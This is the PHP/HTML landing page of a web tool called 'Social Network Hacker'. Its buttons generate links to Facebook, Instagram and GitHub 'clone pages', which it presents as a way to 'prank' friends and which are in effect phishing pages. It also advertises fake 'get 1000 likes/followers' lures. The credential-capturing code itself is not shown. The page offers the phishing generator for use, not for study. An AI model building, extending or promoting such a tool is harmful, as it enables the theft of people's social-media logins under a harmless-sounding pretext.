<?php
session_start();
if(isset($_SESSION['login'])){
  header("Location:Component/home.php");
}
?>
<!doctype html>
<html lang="en" class="h-100">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel = "icon" href = "https://www.clipartmax.com/png/middle/420-4209656_spy-512x512-icon-hacker-png.png">
    <link rel="stylesheet" href="stylesheet/all.css">
    <script src="Javascript/jquery.min.js"></script>
    <script src="Javascript/home.js"></script>
    <title>Social Network Hack </title>
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Lobster&family=PT+Sans&family=Pacifico&family=Permanent+Marker&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Fuzzy+Bubbles:wght@700&family=Lobster&family=PT+Sans&family=Pacifico&family=Permanent+Marker&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Lobster&display=swap');
      * {
        font-family: 'PT Sans', sans-serif; 
        margin:0px;
        padding:2px;
      }
    </style>
  </head>
  <body class="d-flex flex-column h-100">
      <!-- Navbar Start -->
  <nav class="navbar navbar-expand-md navbar-dark bg-dark mb-4">
  <div class="container-fluid">
    <a class="navbar-brand" href="home2.php"><u class="homeHeader" style="font-size:25px; font-family: 'Lobster', cursive;" > Social Network Hacker </u> </a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarCollapse">
      <ul class="navbar-nav me-auto mb-2 mb-md-0">
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="home2.php">Home</a>
        </li>
        <li class="nav-item">
          <a class="nav-link active" href="Component/newUser.php">Register</a>
        </li>
        <li class="nav-item">
          <a class="nav-link active" href="Component/toutrial.php">Toutrial</a>
        </li>
        <li class="nav-item">
          <a class="nav-link active" href="#" data-bs-toggle="modal" data-bs-target="#staticBackdrop">Contact us</a>
        </li>
        <li class="nav-item">
          <a class="nav-link active" href="Component/about2.php">About</a>
        </li>
      </ul>
      <div class="d-flex">
      <a href="index.php"> <button class="btn-sm btn-success">  Login <i class="fas fa-sign-out-alt text-danger"></i> </button> </a>
    </div>
    </div>
  </div>
    </nav>
    <?php include_once('Component/contact.php'); ?>
    <h3 class="text-center">Click on generate and copy the clone page, Prank with your friends  &#129488  </h3>
    <small class="px-2 text-muted text-center"> if You dont knew what should you do ?  <a href="toutrial.php" target="blank"> Learn Toutrial </a> </small>
    <table class="table table-danger border">
        <thead>
            <tr>
                <th scope="col">#</th>
                <th scope="col">Page Name</th>
                <th scope="col" class="text-center">Action</th>
            </tr>
        </thead>
    <tbody>
        <tr>
            <th scope="row">1</th>
            <td> Facebook clone page </td>
            <td class="text-center"> 
            <form action="index.php" method="post">
                        <input type="submit" name="facebook" value="Generate link" class="btn btn-primary">
              </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Instagram clone page </td>
            <td class="text-center"> 
            <form action="index.php" method="post">
                        <input type="submit" name="instagram" value="Generate link" class="btn btn-danger">
              </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Github clone page </td>
            <td class="text-center"> 
            <form action="index.php" method="post">
                        <input type="submit" name="github" value="Generate link" class="btn btn-dark">
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Get 1000 like one click on facebook page </td>
            <td class="text-center"> 
                <form action="" method="post">
                    <input type="submit" name="fbpageLike" value="Generate link" class="btn btn-warning disabled">
                    <input type="hidden" name="copy" value="Copy" class="btn btn-primary">
                    <a href="#"> <input type="hidden"  value="View Page" class="btn btn-success"></a>
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Get 10000 react on facebook profile </td>
            <td class="text-center"> 
                <form action="" method="post">
                    <input type="submit" name="fbprofileReact" value="Generate link" class="btn btn-warning" disabled>
                    <input type="hidden" name="copy" value="Copy" class="btn btn-primary">
                    <a href="#"> <input type="hidden"  value="View Page" class="btn btn-success"></a>
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td> Instagram one click Get 1000 followers </td>
            <td class="text-center"> 
                <form action="" method="post">
                    <input type="submit" name="fbprofileReact" value="Generate link" class="btn btn-warning" disabled>
                    <input type="hidden" name="copy" value="Copy" class="btn btn-primary">
                    <a href="#"> <input type="hidden"  value="View Page" class="btn btn-success"></a>
                </form>
            </td>
        </tr>
        <tr>
            <th scope="row">2</th>
            <td class="position-relative"> Get 10000 react on facebook profile 
            </td>
            <td class="text-center"> 
                <form action="" method="post">
                    <input type="submit" name="fbprofileReact" value="Generate link" class="btn btn-warning" disabled>
                    <input type="hidden" name="copy" value="Copy" class="btn btn-primary">
                    <a href="#"> <input type="hidden"  value="View Page" class="btn btn-success"></a>
                </form>
            </td>
        </tr>
    </tbody>
    </table>
    <footer class="footer mt-auto py-1 bg-dark">
      <div class="container text-center">
        <div class="text-center"> 
          <span class="text-muted">Stay touch with me <i class="fad fa-level-down-alt" style="position:relative;top:5px;"></i> </span> <br>
          <a href="https://www.instagram.com/failure_boy_786/" target="blank"><i class="fab fa-instagram-square fa-2x text-danger"></i></a>
          <a href="mailto: israfil123.sa@gmail.com" target="blank"><i class="fas fa-envelope-square fa-2x text-warning"></i></a>
          <a href="https://www.facebook.com/profile.php?id=100023854041628" target="blank"><i class="fab fa-facebook-square fa-2x text-primary"></i></a>
          <a href="#" target="blank"><i class="fab fa-youtube-square fa-2x text-danger"></i></a>
          <a href="https://wa.me/+916205881326 " target="blank"><i class="fab fa-whatsapp-square fa-2x text-success"></i></a>
        </div>
        <strong class="text-light"> Web Designed & Developed by Sajid Ali </strong> <span class="text-danger"> | 
          <span class="text-muted "> Terms & Condition &#169;2021-22 </span>
      </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
  </body>
</html>
